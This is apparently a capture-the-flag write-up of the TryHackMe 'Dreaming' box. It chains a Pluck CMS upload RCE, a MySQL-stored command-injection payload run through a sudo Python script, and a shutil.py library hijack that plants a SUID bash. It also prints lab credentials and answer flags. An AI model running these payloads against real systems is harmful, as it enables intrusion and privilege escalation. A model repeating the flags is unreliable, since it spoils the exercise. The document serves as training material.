---
title: "TryHackMe - Dreaming"
date: 2025-12-15 10:00:00 +0000
categories: [TryHackMe, Easy]
tags: [pluck-cms, cve-2020-29607, command-injection, python-hijacking, privesc, mysql]
image:
  path: https://cdn.jsdelivr.net/gh/grok-rs/blog-images@main/tryhackme/2025/12-dreaming/cover.png
---

## The Hunt Begins

A box themed around Neil Gaiman's *The Sandman*. Four users—Lucien, Death, Morpheus—all characters from the Dreaming. *Someone had fun with this one.*

| Target | Value |
|--------|-------|
| Platform | TryHackMe |
| Difficulty | Easy |
| Theme | The Sandman |

---

## Reconnaissance

Two ports. Just two.

<!-- TODO: Screenshot - Nmap scan results -->

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 |

SSH was modern—no quick wins there. But Apache showing its default page? *Interesting.* Default pages mean the real app is hiding in a subdirectory.

<details markdown="1">
<summary>💡 Hint - What next?</summary>

Directory brute force. `gobuster` with a common wordlist.

</details>

> **RED Team Logic:** Default Apache page = subdirectory hunting. Always.
{: .prompt-tip }

---

## Web Enumeration

Gobuster found `/app`. Directory listing enabled—*rookie mistake*.

<!-- TODO: Screenshot - /app directory listing -->

Inside: `pluck-4.7.13/`. Version number right in the folder name.

| Property | Value |
|----------|-------|
| CMS | Pluck |
| Version | 4.7.13 |
| Location | `/app/pluck-4.7.13/` |

> **RED Team Insight:** Version numbers in folder names are gifts. Tells us exactly what to search in exploit-db.
{: .prompt-tip }

---

## Vulnerability Research

```bash
searchsploit pluck 4.7
```

Exact match: **CVE-2020-29607** — File Upload RCE. *Authenticated.*

<!-- TODO: Screenshot - searchsploit results -->

Pluck uses password-only authentication. No username. Tried `password`—it worked.

<details markdown="1">
<summary>🔑 Credentials - Pluck CMS</summary>

**Password:** `password`

</details>

> **Why this works:** Developers leave default/weak passwords. Always try the obvious first.
{: .prompt-warning }

---

## Initial Foothold

Downloaded the exploit, ran it:

```bash
python3 pluck_rce.py 10.82.132.190 80 password /app/pluck-4.7.13
```

Webshell uploaded to `/app/pluck-4.7.13/files/shell.phar`. Shell as `www-data`.

<!-- TODO: Screenshot - p0wny webshell -->

Three users caught my eye in `/etc/passwd`:
- **lucien** — The Librarian
- **death** — Morpheus's sister
- **morpheus** — Lord of Dreams

Checked `/opt` for scripts. Found `test.py` with hardcoded credentials.

<details markdown="1">
<summary>🔑 Credentials - Lucien</summary>

Found in `/opt/test.py`:
```python
password = "HeyLucien#@1999!"
```

</details>

---

## Privilege Escalation

### www-data → lucien

```bash
ssh lucien@10.82.132.190
```

<details markdown="1">
<summary>🚩 Flag - Lucien</summary>

Check `~/lucien_flag.txt`

</details>

---

### lucien → death

```bash
sudo -l
```

Lucien can run `/home/death/getDreams.py` as death. *Without password.*

<!-- TODO: Screenshot - sudo -l output -->

The script pulls data from MySQL and echoes it with `shell=True`:

```python
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
```

*Classic command injection.* Control the database, control the command.

<details markdown="1">
<summary>🔑 Credentials - MySQL</summary>

Found in `~/.bash_history`:
```
mysql -u lucien -plucien42DBPASSWORD
```

</details>

> **Why this matters:** `shell=True` with user-controlled input = command injection. The values come from MySQL—if we control the DB, we control execution.
{: .prompt-warning }

<details markdown="1">
<summary>🎯 Solution - Command Injection</summary>

```bash
mysql -u lucien -p'lucien42DBPASSWORD' library \
  -e "UPDATE dreams SET dream = '; cat /home/death/death_flag.txt #' WHERE dreamer = 'Alice';"

sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

</details>

<details markdown="1">
<summary>🚩 Flag - Death</summary>

`THM{1M_TH3R3_4_TH3M}`

</details>

Extracted death's password from the script itself:

<details markdown="1">
<summary>🔑 Credentials - Death</summary>

From `/home/death/getDreams.py`:
```python
DB_PASS = "!mementoMORI666!"
```

</details>

---

### death → morpheus

Ran LinPEAS. Found something *unusual*: death group has write access to `/usr/lib/python3.8/shutil.py`.

<!-- TODO: Screenshot - LinPEAS output showing writable shutil.py -->

A cron job runs `/home/morpheus/restore.py` as morpheus:

```python
from shutil import copy2 as backup
```

*Python library hijacking.* Modify `shutil.py`, wait for cron, profit.

> **RED Team Insight:** Writable system Python libraries = game over. Any script importing them executes your code.
{: .prompt-danger }

<details markdown="1">
<summary>🎯 Solution - Library Hijacking</summary>

Added to `/usr/lib/python3.8/shutil.py`:
```python
import os
os.system("cp /home/morpheus/morpheus_flag.txt /tmp/morph_flag && chmod 777 /tmp/morph_flag")
os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
```

Wait ~1 minute for cron.

</details>

<details markdown="1">
<summary>🚩 Flag - Morpheus</summary>

`THM{DR34MS_5H4P3_TH3_W0RLD}`

</details>

---

### morpheus → root

SUID bash waiting at `/tmp/rootbash`:

```bash
/tmp/rootbash -p
```

<details markdown="1">
<summary>🚩 Flag - Root</summary>

Check `/root/root_flag.txt`

</details>

---

## The Kill Chain

```
www-data ──▶ lucien ──▶ death ──▶ morpheus ──▶ root
   │            │          │           │
   └─RCE        └─creds    └─SQLi      └─lib hijack
```

---

## Lessons Learned

1. **Version disclosure** — Folder name gave away exact CVE
2. **Default passwords** — `password` actually worked
3. **Bash history** — MySQL creds left in plain sight
4. **Writable system files** — death group write access = privesc
5. **Cron + imports** — Library hijacking through scheduled tasks

---

<details markdown="1">
<summary>🚩 All Flags</summary>

| User | Flag |
|------|------|
| lucien | *check the box* |
| death | `THM{1M_TH3R3_4_TH3M}` |
| morpheus | `THM{DR34MS_5H4P3_TH3_W0RLD}` |
| root | *check the box* |

</details>

---

## Tools Used

- nmap, gobuster, searchsploit
- MySQL, LinPEAS
- Python (for library hijacking)
